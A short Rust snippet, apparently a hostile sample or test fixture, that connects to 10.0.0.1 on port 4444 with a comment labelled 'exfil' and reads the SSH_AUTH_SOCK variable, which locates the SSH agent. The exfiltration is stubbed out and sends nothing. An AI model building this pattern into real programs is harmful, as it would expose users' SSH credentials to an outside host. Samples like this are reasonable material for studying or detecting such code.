use std::env;
use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    let _v = env::var("SSH_AUTH_SOCK").unwrap_or_default();
}
